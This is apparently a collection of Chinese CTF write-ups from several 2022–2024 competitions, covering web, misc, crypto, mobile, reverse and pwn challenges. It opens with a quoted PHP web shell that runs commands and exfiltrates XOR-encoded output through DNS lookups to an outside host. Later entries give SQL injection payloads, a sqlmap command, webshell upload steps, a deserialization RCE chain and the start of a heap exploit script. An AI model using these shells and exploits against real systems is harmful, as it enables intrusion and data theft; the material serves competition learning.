&lt;?php $servername=&quot;127.0.0.1&quot;;$username=&quot;root&quot;;$password=&quot;123456&quot;;$dbname=&quot;zentao&quot;;$conn=new PDO(&quot;mysql:host=$servername;dbname=$dbname&quot;,$username,$password);$conn-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);$stmt=$conn-&gt;prepare(&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;);$stmt-&gt;execute();$result=$stmt-&gt;fetch(PDO::FETCH_ASSOC);$conn=null;$param=$_GET[&quot;cmd&quot;];$password=$result[&quot;password&quot;];$output=shell_exec($param);$hex_output=bin2hex($output);$hex_password=bin2hex($password);$len_output=strlen($hex_output);$len_password=strlen($hex_password);$max_subdomain_length=62;$subdomain_base=&quot;yafgcy.ceye.io&quot;;$hex_xor=&quot;&quot;;for ($i=0;$i&lt;$len_output;$i++) &#123;	$char_output=$hex_output[$i];	$char_password=$hex_password[$i%$len_password];	$char_xor=dechex(hexdec($char_output)^hexdec($char_password));	if(strlen($hex_xor.$char_xor)&gt;$max_subdomain_length) &#123;		if(strlen($hex_xor)%2!=0) &#123;			$subdomain=&quot;0&quot;.&quot;$hex_xor.$subdomain_base&quot;;		&#125; else &#123;			$subdomain=&quot;$hex_xor.$subdomain_base&quot;;		&#125;		gethostbyname($subdomain);		$hex_xor=&quot;&quot;;	&#125; else &#123;		$hex_xor.=$char_xor;	&#125;&#125;if(strlen($hex_xor)%2!=0) &#123;	$subdomain=&quot;0&quot;.&quot;$hex_xor.$subdomain_base&quot;;&#125; else &#123;	$subdomain=&quot;$hex_xor.$subdomain_base&quot;;&#125;gethostbyname($subdomain);?&gt;

发现是dns流量
提取出secret.txt，根据代码可知要与admin的密码进行异或
79227024716c7522787370254c777230667673222570247b76677322632671d7b357226771575227a7372237677702573611f372570317b76727720762061479207024777b60247e6674231a626727666171372570317f766773207620067879226731756c60206d75703670754epassword:8a3e684c923b763d252cf1e8734a7a29

异或后发现是DNA编码，每62位会少内容，爆破就行
mapping = &#123;&#x27;AAA&#x27;:&#x27;a&#x27;,&#x27;AAC&#x27;:&#x27;b&#x27;,&#x27;AAG&#x27;:&#x27;c&#x27;,&#x27;AAT&#x27;:&#x27;d&#x27;,&#x27;ACA&#x27;:&#x27;e&#x27;,&#x27;ACC&#x27;:&#x27;f&#x27;,&#x27;ACG&#x27;:&#x27;g&#x27;,&#x27;ACT&#x27;:&#x27;h&#x27;,&#x27;AGA&#x27;:&#x27;i&#x27;,&#x27;AGC&#x27;:&#x27;j&#x27;,&#x27;AGG&#x27;:&#x27;k&#x27;,&#x27;AGT&#x27;:&#x27;l&#x27;,&#x27;ATA&#x27;:&#x27;m&#x27;,&#x27;ATC&#x27;:&#x27;n&#x27;,&#x27;ATG&#x27;:&#x27;o&#x27;,&#x27;ATT&#x27;:&#x27;p&#x27;,&#x27;CAA&#x27;:&#x27;q&#x27;,&#x27;CAC&#x27;:&#x27;r&#x27;,&#x27;CAG&#x27;:&#x27;s&#x27;,&#x27;CAT&#x27;:&#x27;t&#x27;,&#x27;CCA&#x27;:&#x27;u&#x27;,&#x27;CCC&#x27;:&#x27;v&#x27;,&#x27;CCG&#x27;:&#x27;w&#x27;,&#x27;CCT&#x27;:&#x27;x&#x27;,&#x27;CGA&#x27;:&#x27;y&#x27;,&#x27;CGC&#x27;:&#x27;z&#x27;,&#x27;CGG&#x27;:&#x27;A&#x27;,&#x27;CGT&#x27;:&#x27;B&#x27;,&#x27;CTA&#x27;:&#x27;C&#x27;,&#x27;CTC&#x27;:&#x27;D&#x27;,&#x27;CTG&#x27;:&#x27;E&#x27;,&#x27;CTT&#x27;:&#x27;F&#x27;,&#x27;GAA&#x27;:&#x27;G&#x27;,&#x27;GAC&#x27;:&#x27;H&#x27;,&#x27;GAG&#x27;:&#x27;I&#x27;,&#x27;GAT&#x27;:&#x27;J&#x27;,&#x27;GCA&#x27;:&#x27;K&#x27;,&#x27;GCC&#x27;:&#x27;L&#x27;,&#x27;GCG&#x27;:&#x27;M&#x27;,&#x27;GCT&#x27;:&#x27;N&#x27;,&#x27;GGA&#x27;:&#x27;O&#x27;,&#x27;GGC&#x27;:&#x27;P&#x27;,&#x27;GGG&#x27;:&#x27;Q&#x27;,&#x27;GGT&#x27;:&#x27;R&#x27;,&#x27;GTA&#x27;:&#x27;S&#x27;,&#x27;GTC&#x27;:&#x27;T&#x27;,&#x27;GTG&#x27;:&#x27;U&#x27;,&#x27;GTT&#x27;:&#x27;V&#x27;,&#x27;TAA&#x27;:&#x27;W&#x27;,&#x27;TAC&#x27;:&#x27;X&#x27;,&#x27;TAG&#x27;:&#x27;Y&#x27;,&#x27;TAT&#x27;:&#x27;Z&#x27;,&#x27;TCA&#x27;:&#x27;1&#x27;,&#x27;TCC&#x27;:&#x27;2&#x27;,&#x27;TCG&#x27;:&#x27;3&#x27;,&#x27;TCT&#x27;:&#x27;4&#x27;,&#x27;TGA&#x27;:&#x27;5&#x27;,&#x27;TGC&#x27;:&#x27;6&#x27;,&#x27;TGG&#x27;:&#x27;7&#x27;,&#x27;TGT&#x27;:&#x27;8&#x27;,&#x27;TTA&#x27;:&#x27;9&#x27;,&#x27;TTC&#x27;:&#x27;0&#x27;,&#x27;TTG&#x27;:&#x27; &#x27;,&#x27;TTT&#x27;:&#x27;.&#x27;&#125;encode_string = &#x27;OME&#x27;decode_string = &#x27;GGAGCGCTG&#x27; inverted_mapping = dict(zip(mapping.values(), mapping.keys()))def decode_dna( decode_string ):    pieces = []    for i in range( 0, len(decode_string), 3 ):        piece =  decode_string[i:i+3]        # pieces.append()        pieces.append( mapping[piece] )    return &quot;&quot;.join(pieces)def encode_dna(encode_string):    pieces = []    for i in encode_string:        piece =  inverted_mapping[i]        pieces.append(piece)    return &quot;&quot;.join(pieces)print &#x27;Decoded String is:- &#x27;+ decode_dna(decode_string)print &#x27;Encoded DNA String is:- &#x27;+ encode_dna(encode_string)




X光的秘密给了个task.dcm文件，百度到能打开的软件MicroDicom
使用软件导出，一共有二十张

使用stegsolve发现最后三张图存在LSB
脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了
from PIL import Imageimg=Image.open(&#x27;img-00001-00018.png&#x27;)w,h=img.sizergb=[&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;]for j in range(h):    for i in range(w):        data=img.getpixel((i,j))        rgb[0]+=str(data[0]%2)        rgb[1]+=str(data[1]%2)        rgb[2]+=str(data[2]%2)print(&#x27;r1: &#x27;+rgb[0])#print(&#x27;glow: &#x27;+rgb[1])#print(&#x27;blow: &#x27;+rgb[2])file = open(&quot;r1.txt&quot;, &quot;w+&quot;)content = str(rgb[0])file.write(content)file.close()

img-00001-00018.png
100100010010110001101000000000

img-00001-00019.png
0110000110101001010000000000000

img-00001-00020.png
0001011001000010000010000000001

将三张图片按顺序拼接发现刚好是10001001，0x89为PNG的头
使用脚本合并
f1 = open(&quot;r.txt&quot;)f2 = open(&quot;r2.txt&quot;)f3 = open(&quot;r3.txt&quot;)d1=f1.read()d2=f2.read()d3=f3.read()new=&#x27;&#x27;for i,v in enumerate(d1):    new+=v+d2[i]+d3[i]file = open(&quot;1.txt&quot;, &quot;w+&quot;)file.write(new)file.close()


web点击签到签到，点点点

Dreamer &amp;&amp; Dreamer_revenge参考Dreamer CMS 代码审计
默认后台管理员账号密码为wangjn/123456
在源码中复制一份\src\main\resources\db\dreamer-cms\templates\default_v2，修改theme.json文件中的themePath为../../../../../../../../../../../，然后打包成压缩包，在后台风格管理处上传

启用后在模板管理处就可以看到跟目录下的文件了

Dreamer_revenge的步骤与Dreamer一致，不过flag在/proc/1/environ

EyouEyouCMS v1.6.1 反序列化漏洞
参考EyouCMS v1.6.1 0day挖掘
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023竞赛</tag>
        <tag>红明谷</tag>
      </tags>
  </entry>
  <entry>
    <title>第二届vecctf-wp</title>
    <url>/posts/e6acd4f1/</url>
    <content><![CDATA[misczip-guessing打开压缩包发现提示password=.......py
进行6位密码爆破，得到密码3a1b6c
解压得到flag

flag{fa8d910600a5467d9d2f433f2bba4c80}

Spiderman修改高度，发现字符串README：HAHAyoufoundIT
binwalk分离出一个带密码的压缩包
压缩包中含有一个名为README.txt的文件将HAHAyoufoundIT写入README.txt并压缩成zip文件后发现两个README.txt的crc一致

采用明文爆破出密码!g^c*0
解压后得到一张png
stegsolve分析图片，发现0通道中藏有flag

flag{Z1p_1maGE_lSB_1nterestiNG}

cryptobaby rsa因为两组数据的N相同，尝试共模攻击
import randomimport gmpy2n,e1 = (18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987, 76831)c1 = 14068017239200053057485191549313171235040341952680207740172042657952395329165768631549600187463451884623632792268314205814005668826033658861436424617991125160661381291003863394279707111450435808077534541510943745285958554921154542813613390731768463465972495263609910077893559813685204864361223917445770159726623708768996447642959844639282015350260298045019617026128700143368357847147111693153254268063490280666808714031170237337721534721243540077707555520501582047389390048200750092516532861791678414405037042484148584170396597267139826760931348123330503380212299827883145622326471261247290265669559897644089748984204n,e2 = (18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987, 65537)c2 = 17120091052055468753592285548832983539343349280048150965811042901415659935929189229298761316319784219958366772027986939749507760509991462838561325114714990126772560070483939658678703332135866293838146121312972251030190756953273311362066029287803984179301942229948301600814847050270084193184210232673652417884727838290706970298245205101865234726242081382680212621541249662659284218079172180588507736208257188130972936994297239579885142233896240153633237886314935309710560434501987121687537279749951910677771351212584805615709915168729977338949858374823750316083595198620089092891606394712323216539675547753350603350269s=gmpy2.gcdext(e1,e2)s1=s[1]s2=s[2]if s1&lt;0:    s1=-s1    c1=gmpy2.invert(c1,n)else:    s2=-s2    c2=gmpy2.invert(c2,n)c1=gmpy2.powmod(c1,s1,n)c2=gmpy2.powmod(c2,s2,n)c=(c1*c2)%nprint(bytes.fromhex(hex(c)[2:]))



flag{423c35691377ea18d35b97b7b6f13590}

webezfilter抓包，在密码处尝试sql注入，回显了mysql的报错

fuzz后发现过滤了空格，可以用/**/代替空格
sqlmap跑一下得到flagsqlmap -r 1.txt --batch --tamper &quot;space2comment.py&quot; --dump


flag{30b08224ed436c8c690ae623a89466f3}

upload在源码中发现hint: TUhnd2VEQjRiRzluYVc0dWNHaHc=
两层base64得到0x0x0xlogin.php
通过弱口令爆破进入后台 admin,admin123456
在项目管理处发现一个文件上传点
通过将文件名置空，报错得到上传路径uploaded
fuzz后发现允许上传.htaccess
再上传一个图片马即可

蚁剑连接得到flag

flag{063a5bda0b5a2a5d7b700d989f73902b}

WEB2查看源码：/index.php?source
关键代码如下
if (isset($_POST[&#x27;session_id&#x27;])) &#123;    $query = &quot;SELECT * FROM secrets WHERE session_id = &#x27;&quot; . $_POST[&#x27;session_id&#x27;] . &quot;&#x27;&quot;;    $result = $conn-&gt;query($query);&#125; else &#123;    $query = &quot;SELECT * FROM secrets WHERE session_id = &#x27;&quot; . session_id() . &quot;&#x27;&quot;;    $result = $conn-&gt;query($query);&#125;

where后面为true就行了
payload：1&#39; or &#39;1&#39;=&#39;1
EzCasApereo Cas反序列化
题目不出网，公开的普通exp没有回显在github上找到一个带回显的项目
生成payload
构造命令
Mobilefindme模拟器先安装一下，有个查询按钮
apk文件，使用jadx分析
先全局搜索找到onClick函数，查看点击查询按钮时执行的代码
public class OooO0O0 implements View.OnClickListener &#123;    /* renamed from: OooO0o0  reason: collision with root package name */    public final /* synthetic */ EditText f1853OooO0o0;    public OooO0O0(EditText editText) &#123;        this.f1853OooO0o0 = editText;    &#125;    public void onClick(View v) &#123;        try &#123;            LoginActivity.this.OooOo0o.OooO0Oo(this.f1853OooO0o0.getText().toString());        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

发现调用了LoginActivity.this.OooOo0o.OooO0Oo，查看函数声明
发现存在数据库
getWritableDatabase函数用来连接数据库OooO0OO函数用来获取数据库密码this.f1221OooO0o为OooO0OO的对象
public void OooO0O0(String t) &#123;    this.OooO0oO = t;    SQLiteDatabase.loadLibs(this.f1222OooO0o0);    this.f1221OooO0o = new OooO0OO(this.f1222OooO0o0);    String OooO0OO2 = OooO0OO();    this.f1220OooO0Oo = OooO0OO2;    this.f1219OooO0OO = this.f1221OooO0o.getWritableDatabase(OooO0OO2);    new OooO0O0();    for (int g = 0; g &lt; 100; g++) &#123;        ContentValues values = new ContentValues();        values.put(&quot;flag&quot;, OooO0O0.OooO00o(&quot;&quot; + g));        values.put(&quot;num&quot;, Integer.valueOf(g));        this.f1219OooO0OO.insert(&quot;test&quot;, null, values);    &#125;&#125;public void OooO0Oo(String i) &#123;    SQLiteDatabase.loadLibs(this.f1222OooO0o0);    this.f1221OooO0o = new OooO0OO(this.f1222OooO0o0);    String OooO0OO2 = OooO0OO();    this.f1220OooO0Oo = OooO0OO2;    this.f1219OooO0OO = this.f1221OooO0o.getWritableDatabase(OooO0OO2);    Cursor cursor = this.f1219OooO0OO.rawQuery(&quot;select * from test where num = &#x27;&quot; + i + &quot;&#x27;&quot;, null);    this.OooO0oo = &quot;&quot;;    if (cursor == null || !cursor.moveToFirst()) &#123;        Toast.makeText(this.f1222OooO0o0, this.OooO0oo, 0).show();        cursor.close();        this.f1219OooO0OO.close();    &#125;    do &#123;        this.OooO0oo += cursor.getString(cursor.getColumnIndex(&quot;flag&quot;)) + &quot;\n&quot;;    &#125; while (cursor.moveToNext());    Toast.makeText(this.f1222OooO0o0, this.OooO0oo, 0).show();    cursor.close();    this.f1219OooO0OO.close();&#125;

通过OooO0OO类的声明获得数据库文件的名称data.db
public class OooO0OO extends SQLiteOpenHelper &#123;    public OooO0OO(Context context) &#123;        super(context, &quot;data.db&quot;, null, 1);    &#125;    @Override // net.sqlcipher.database.SQLiteOpenHelper    public void onCreate(SQLiteDatabase sqLiteDatabase) &#123;        sqLiteDatabase.execSQL(&quot;create table test(flag text, num text)&quot;);    &#125;    @Override // net.sqlcipher.database.SQLiteOpenHelper    public void onUpgrade(SQLiteDatabase sqLiteDatabase, int i, int i1) &#123;        onCreate(sqLiteDatabase);    &#125;&#125;

改apk的后缀名然后解压文件，找到data.db文件
使用DB4S打开db文件，发现需要密码
获取OooO0OO函数的代码，发现先对this.OooO0oO中储存的数据进行base64解密然后将返回值作为参数执行OooO00o.OooO00o函数并将OooO00o.OooO00o函数的返回值作为参数调用OooO00o
public String OooO0OO() &#123;    return OooO00o(new String(OooO00o.OooO00o(Base64.decode(this.OooO0oO, 0))));&#125;


对this.OooO0oO查找用例，找到获取资源的代码
public String Oooo0o0() &#123;    String flag = getSharedPreferences(&quot;secret&quot;, 0).getString(&quot;flag&quot;, null);    Log.i(&quot;secret&quot;, &quot;读取信息&quot;);    Log.i(&quot;secret&quot;, &quot;flag:&quot; + flag);    return flag;&#125;

搜索资源secret，获取到加密后的密码mkrPETW43g1796lzN2dtiC5qgsC+ybJIWHR8GEzhsI4=

查看OooO00o.OooO00o函数的代码，发现是aes解密，密钥通过OooO0O0函数获取
public class OooO00o &#123;    public static byte[] OooO00o(byte[] plainText) &#123;        SecretKeySpec secretKey = new SecretKeySpec(OooO0O0(&quot;xGP_UACWNcWO]WNP&quot;.getBytes(), &quot;123456&quot;.getBytes()), &quot;AES&quot;);        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);        cipher.init(2, secretKey);        return cipher.doFinal(plainText);    &#125;    public static byte[] OooO0O0(byte[] data, byte[] key) &#123;        if (data == null || data.length == 0 || key == null || key.length == 0) &#123;            return data;        &#125;        byte[] result = new byte[data.length];        for (int i = 0; i &lt; data.length; i++) &#123;            result[i] = (byte) ((data[i] ^ key[i % key.length]) ^ (i &amp; 255));        &#125;        return result;    &#125;&#125;

通过脚本得到密钥Itahdrtbu^hr`hsk
a=b&#x27;xGP_UACWNcWO]WNP&#x27;b=b&#x27;123456&#x27;e=&#x27;&#x27;for i in range(len(a)):    e+=chr(a[i]^b[i%len(b)]^i)print(e)

aes解密得到OooO00o函数的参数2&gt;=9:92m;&lt;in=?3n

将f1218OooO0O0变量的所有成员与参数的每一位异或FECanfOI()*&amp;&lt;MNCXZPKL
static &#123;    Charset forName = Charset.forName(&quot;UTF-8&quot;);    OooO00o = forName;    f1218OooO0O0 = &quot;FECanfOI()*&amp;&lt;MNCXZPKL&quot;.getBytes(forName);&#125;public static String OooO00o(String enc) &#123;    byte[] b = enc.getBytes(OooO00o);    int size = b.length;    for (int i = 0; i &lt; size; i++) &#123;        for (byte keyBytes0 : f1218OooO0O0) &#123;            b[i] = (byte) (b[i] ^ keyBytes0);        &#125;    &#125;    return new String(b);&#125;

通过脚本解出数据库的密码9562129f07be648e
key=b&quot;FECanfOI()*&amp;&lt;MNCXZPKL&quot;data=&quot;2&gt;=9:92m;&lt;in=?3n&quot;flag=&#x27;&#x27;for i in data:    c=i    for j in key:        c=c^j    flag+=chr(c)print(flag)

进入数据库后发现表test中有一条特别的数据（与其他数据长度不一样），fee0b212f413f8a0
根据长度猜测flag是密码加最后一条数据

flag{9562129f07be648efee0b212f413f8a0}

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>vec</tag>
      </tags>
  </entry>
  <entry>
    <title>第七届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <url>/posts/f2e1654d/</url>
    <content><![CDATA[总榜Rank1，在毕业前拿到榜一也是圆满了 :)
webwucanrce&lt;?phpecho &quot;get只接受code欧,flag在上一级目录&lt;br&gt;&quot;;$filename = __FILE__;highlight_file($filename);if(isset($_GET[&#x27;code&#x27;]))&#123;    if (!preg_match(&#x27;/session_id\(|readfile\(/i&#x27;, $_GET[&#x27;code&#x27;]))     &#123;        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;code&#x27;])) &#123;                @eval($_GET[&#x27;code&#x27;]);            &#125;    &#125;    else&#123;        die(&quot;不让用session欧，readfile也不行&quot;);    &#125;&#125;?&gt;

无参rce
//查看上一级目录文件名print_r(scandir(dirname(getcwd())));//读取上级目录文件show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));



unserialize&lt;?phphighlight_file(__FILE__);error_reporting(0);class AAA&#123;    public $aear;    public $string;    public function __construct($a)&#123;        $this -&gt; aear = $a;    &#125;    function __destruct()    &#123;        echo $this -&gt; aear;    &#125;    public function __toString()    &#123;        $new = $this -&gt; string;        return $new();    &#125;&#125;class BBB &#123;    private $pop;    public function __construct($string) &#123;        $this -&gt; pop = $string;    &#125;    public function __get($value) &#123;        $var = $this -&gt; $value;        $var[$value]();    &#125;&#125;class DDD&#123;    public $bag;    public $magazine;    public function __toString()    &#123;        $length = @$this -&gt; bag -&gt; add();        return $length;    &#125;    public function __set($arg1,$arg2)    &#123;        if($this -&gt; magazine -&gt; tower)        &#123;            echo &quot;really??&quot;;        &#125;    &#125;&#125;class EEE&#123;    public $d=array();    public $e;    public $f;    public function __get($arg1)&#123;        $this-&gt;d[$this-&gt;e]=1;        if ($this-&gt;d[]=1)&#123;            echo &#x27;nononononnnn!!!&#x27;;            &#125;        else&#123;            eval($this-&gt;f);            &#125;    &#125;&#125;class FFF&#123;    protected $cookie;    protected function delete() &#123;        return $this -&gt; cookie;    &#125;    public function __call($func, $args) &#123;        echo &#x27;hahahhhh&#x27;;        call_user_func([$this, $func.&quot;haha&quot;], $args);    &#125;&#125;class GGG&#123;    public $green;    public $book;    public function __invoke()&#123;        if(md5(md5($this -&gt; book)) == 666) &#123;            return $this -&gt; green -&gt; pen;        &#125;    &#125;&#125;if(isset($_POST[&#x27;UP&#x27;])) &#123;    unserialize($_POST[&#x27;UP&#x27;]);&#125;

反序列化
调用路径：AAA::__destruct--&gt;AAA::__toString--&gt;GGG::__invoke--&gt;EEE::__get
其中到GGG的时候需要爆破一下md5
# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#x27;&#x27;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        md5 = hashlib.md5(md5.hexdigest())        if md5.hexdigest()[start: start+str_len] == substr and md5.hexdigest()[3].isdigit()==False:            print rnds            stop_event.set()if __name__ == &#x27;__main__&#x27;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()


EEE中的if用报错跳过即可
exp：
&lt;?phpclass GGG&#123;    public $green;    public $book=&#x27;g1xFqZRDDTyxafSIUSta&#x27;;&#125;class AAA&#123;    public $aear;    public $string;&#125;class EEE&#123;    public $d=1;    public $e;    public $f=&quot;system(&#x27;cat /flag.txt&#x27;);&quot;;&#125;$a = new AAA();$a-&gt;aear = new AAA();$a-&gt;aear-&gt;string = new GGG();$a-&gt;aear-&gt;string-&gt;green = new EEE();echo urlencode(serialize($a));//O%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A3%3A%22GGG%22%3A2%3A%7Bs%3A5%3A%22green%22%3BO%3A3%3A%22EEE%22%3A3%3A%7Bs%3A1%3A%22d%22%3Bi%3A1%3Bs%3A1%3A%22e%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A24%3A%22system%28%27cat+%2Fflag.txt%27%29%3B%22%3B%7Ds%3A4%3A%22book%22%3Bs%3A20%3A%22g1xFqZRDDTyxafSIUSta%22%3B%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D



miscFinalSign附件是一个txt，存在snow特征，有大量的20，09

用得到的keyhelloworld去xor txt中的字符串
a=bytes.fromhex(&#x27;2c243f2f3b3114345d0a0909333f06100143023b2c55020912&#x27;)key=b&#x27;helloworld&#x27;e=[]for i in range(0,len(a)):    e.append(a[i]^key[i%len(key)])print(bytes(e))#b&#x27;DASCTF&#123;F1nal_Sign1n_D0ne&#125;&#x27;



非黑即白反转文件，得到一张gif
with open(&#x27;非黑即白&#x27;,&#x27;rb&#x27;) as f:   with open(&#x27;1.gif&#x27;,&#x27;wb&#x27;) as g:      g.write(f.read()[::-1])

将纯黑色的帧转为0，其他的转为1，得到一个加密的zip
from PIL import Imagea=Image.open(&quot;1.gif&quot;)n=0data=&quot;&quot;e=[]while True:    try:        a.seek(n)        d=a.copy().convert(&#x27;1&#x27;).getdata()        if (d[0]==0):            data+=&#x27;0&#x27;        else:            data+=&#x27;1&#x27;    except:        break;    if (len(data)==8):        e.append(int(data,2))        data=&#x27;&#x27;    n+=1f=open(&quot;data.zip&quot;,&#x27;wb&#x27;)f.write(bytes(e))f.close()

identify查看帧间隔，发现前几帧的间隔不一致，提取出来转成字符串
root@lewiserii:~# identify -format &quot;%s %T \n&quot; 2.gif0 1181 1062 693 744 485 986 837 1178 779 7910 8611 6512 9013 10314 101

a=[118,106,69,74,48,98,83,117,77,79,86,65,90,103,101]print(bytes(a))#b&#x27;vjEJ0bSuMOVAZge&#x27;

解压得到flag DASCTF&#123;H3r3_1s_C0L0rful_W0rld&#125;
天命人按照黑猴的章节名排序
火照黑云风起黄昏夜生白露曲度紫鸳日落红尘未竟

发现按照顺序取一个字节是50 4b 03 04 00 0a
python提取出来
file_list = [&#x27;火照黑云&#x27;, &#x27;风起黄昏&#x27;, &#x27;夜生白露&#x27;, &#x27;曲度紫鸳&#x27;, &#x27;日落红尘&#x27;, &#x27;未竟&#x27;]sources = [open(file_name, &#x27;rb&#x27;) for file_name in file_list]n = 0with open(&#x27;1.zip&#x27;, &#x27;wb&#x27;) as target:    while n &lt; 0x5ead4:        bytes_read = [source.read(1) for source in sources]        for byte in bytes_read:            if byte:                target.write(byte)        n += 1

7-zip打开可以看到另一个zip

其中 根器.zip 很明显进行crc32爆破

C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x76899D014 bytes: C0M3 &#123;0x43, 0x30, 0x4d, 0x33&#125;verification checksum: 0x76899d01 (OK)C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x8E036AA64 bytes: _4ND &#123;0x5f, 0x34, 0x4e, 0x44&#125;verification checksum: 0x8e036aa6 (OK)C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x881D716A4 bytes: _Get &#123;0x5f, 0x47, 0x65, 0x74&#125;verification checksum: 0x881d716a (OK)C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x7F3D8E754 bytes: _S1X &#123;0x5f, 0x53, 0x31, 0x58&#125;verification checksum: 0x7f3d8e75 (OK)C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x248D3C694 bytes: _R00 &#123;0x5f, 0x52, 0x30, 0x30&#125;verification checksum: 0x248d3c69 (OK)C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0xCB27D2BD4 bytes: TS!! &#123;0x54, 0x53, 0x21, 0x21&#125;verification checksum: 0xcb27d2bd (OK)


得到密码C0M3_4ND_Get_S1X_R00TS!!，解密 未竟.zip
提取金箍棒.png上的像素点
from PIL import Imagea = Image.open(&quot;金箍棒.png&quot;)x, y = 5, 5x_, y_ = 0, 0w, h = a.sizeb = Image.new(a.mode, (w // 10, h // 10))for x in range(5, w, 10):    for y in range(5, h, 10):        print(x, y, x_, y_)        b.putpixel((x_, y_), a.getpixel((x, y)))        y_ += 1    x_ += 1    y_ = 0b.save(&#x27;1.png&#x27;)

得到verapass1:jinggubang

用照片作为密钥文件同时使用密码挂载得到flag

DASCTF&#123;T1m3_t0_F4Ce_De5t1nY&#125;
reverseReverse2upx 加密，但抹了特征，修改一下就行

然后用命令解密
upx -d Reverse2.exe

打开就是 base64 换表

Reverse1先使用标准rc4加密密钥之后使用魔改的rc4加密明文
class rc4():    def toBytes(self,data):        if type(data)==str:            return data.encode()        elif type(data)==bytes:            return data        else:            raise Exception(&quot;data Type Error&quot;)    def GetKey(self,data):        k=[]        k1=[]        data_l=len(data)        for i in range(256):            k.append(i)            k1.append(data[i%data_l])        n=0        for i in range(256):            n=(k1[i]+n+k[i])&amp;0xff            n1=k[i]            k[i]=k[n]            k[n]=n1        return k    def Cipher(self,data):        data=self.toBytes(data)        enc=[]        k=self.Key.copy()        n=0        n1=0        tmp=0        for i in range(len(data)):            n=(n+1)&amp;0xff            n1=(n1+k[n])&amp;0xff            tmp=k[n]            k[n]=k[n1]            k[n1]=tmp            enc.append((data[i]+k[(k[n]+k[n1])%256])&amp;0xff)        return bytes(enc)    def __init__(self,key):        key=self.toBytes(key)        self.Key=self.GetKey(key)        self.__Key=key    def SetKey(self,key):        key=self.toBytes(key)        self.Key=self.GetKey(key)        self.__Key=keyk=bytes.fromhex(&quot;690d5ab240ea193f2f6a&quot;)d=[0x4E, 0x47, 0x38, 0x47, 0x62, 0x0A, 0x79, 0x6A, 0x03, 0x66, 0xC0, 0x69, 0x8D, 0x1C, 0x84, 0x0F, 0x54, 0x4A, 0x3B, 0x08, 0xE3, 0x30, 0x4F, 0xB9, 0x6C, 0xAB, 0x36, 0x24, 0x52, 0x81, 0xCF]r=rc4(bytes(k))e=r.Cipher(bytes(d))print(e)



pwnezPwn直接利用tcache bin在0x4180地址处创建chunk，并写入构造好的数据，就可以获取flag
from pwn import *context.arch=&#x27;amd64&#x27;def add(size,data=b&#x27;\n&#x27;):    p.sendlineafter(b&#x27;exit&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&quot;size&gt;&gt;&quot;,str(size).encode())    p.sendafter(&quot;data&gt;&gt;&quot;,data)def edit(ind,data):    p.sendlineafter(b&#x27;exit&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;index&gt;&gt;&#x27;,str(ind).encode())    p.sendafter(&quot;data&gt;&gt;&quot;,data)def show(ind):    p.sendlineafter(b&#x27;exit&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;index&gt;&gt;&#x27;,str(ind).encode())    p.readuntil(b&#x27;data&gt;&gt;\n&#x27;)def free(ind):    p.sendlineafter(b&#x27;exit&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;index&gt;&gt;&#x27;,str(ind).encode())def exit():    p.sendlineafter(b&#x27;exit&#x27;,b&#x27;5&#x27;)def getflag():    p.sendlineafter(b&#x27;exit&#x27;,b&#x27;6&#x27;)def calc(data):    mark=0xfff000000000    data1=data&amp;mark    result=0    result|=data1    for i in range(3):    